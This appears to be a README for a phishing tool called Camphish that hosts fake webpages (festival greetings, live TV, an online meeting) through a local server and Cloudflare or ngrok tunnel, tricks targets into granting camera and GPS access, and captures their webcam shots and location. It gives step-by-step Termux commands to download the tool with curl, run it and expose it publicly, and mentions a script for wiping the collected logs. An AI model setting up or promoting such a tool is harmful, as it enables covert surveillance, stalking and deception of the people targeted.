Grab cam shots & GPS location from target's phone front camera or PC webcam just sending a link.


This succinctly captures the core functionality: hosting a fake webpage (via PHP server + tunnel), prompting victims for camera (and optionally GPS) permissions, then capturing their webcam images and location—simply by sharing the generated link.
 
### [TERMUX] Instagram Install Comments

```
pkg update && pkg upgrade -y
```
```
pkg install curl git nodejs cloudflared
```
```
curl -L -o cambest.tar.gz https://github.com/webappsite/Camphish/raw/refs/heads/main/cambest.tar.gz
```
```
tar -xvzf cambest.tar.gz && rm cambest.tar.gz
```
```
cd cambest
```
```
npm start
```
### Public url command
```
cloudflared tunnel --url localhost:5000
```


Hosts a fake webpage using a built-in PHP server and tunnel (ngrok or Cloudflare)

Requests and captures webcam snapshots from the target

Collects GPS location data, including coordinates and accuracy

Offers multiple webpage templates, such as Festival Wishing, Live YouTube TV, and an Online Meeting (beta)

Includes a cleanup script to remove logs, images, and location data  


Supported platforms include Kali Linux, Termux, MacOS, Ubuntu, Parrot OS, and Windows WSL  .

## 📌 Contact Me  

<a href="https://youtube.com/@zerodarknexus">
  <img src="https://img.shields.io/badge/YouTube-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="YouTube">
</a>  
<br>  

<a href="https://github.com/Masterdas?tab=repositories">
  <img src="https://img.shields.io/badge/GitHub-000000?style=for-the-badge&logo=github&logoColor=white" alt="GitHub">
</a>  
<br>  

<a href="https://t.me/ZeroHackNexus">
  <img src="https://img.shields.io/badge/Telegram-26A5E4?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
</a>  
<br>  

<a href="https://chat.whatsapp.com/II35pNaN25rHqnUmqXK6ag">
  <img src="https://img.shields.io/badge/WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
</a>
